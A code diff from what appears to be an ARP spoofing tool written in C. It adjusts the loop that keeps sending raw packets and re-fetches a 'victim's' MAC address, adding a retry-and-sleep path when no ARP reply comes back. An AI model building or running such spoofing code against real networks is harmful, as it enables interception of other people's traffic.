@@ -32,7 +32,7 @@ int main(int c, char *z[])
 	while (1) {
 		errn1(sendto(packet_socket, msg, len, 0, (struct sockaddr*)&sa_ll, sizeof(struct sockaddr_ll)), "sendto error");
 		packet_sent++;
-		if (packet_sent == 60 * cnt) {
+		while (packet_sent == 60 * cnt) {
 			#ifdef DEBUG
 			puts("going to get fresh mac address of the victim");
 			#endif
@@ -68,8 +68,13 @@ int main(int c, char *z[])
 				#endif
 				while (i<6)
 					msg[6+i]=msg[22+i]=msg[32+i]=new_mac[i], i++;
+				packet_sent=0;
+			} else {
+				#ifdef DEBUG
+				puts("arp reply not received, going to sleep...");
+				#endif
+				sleep(60);
 			}
-			packet_sent=0;
 		}
 		nanosleep(&t, NULL);
 	}
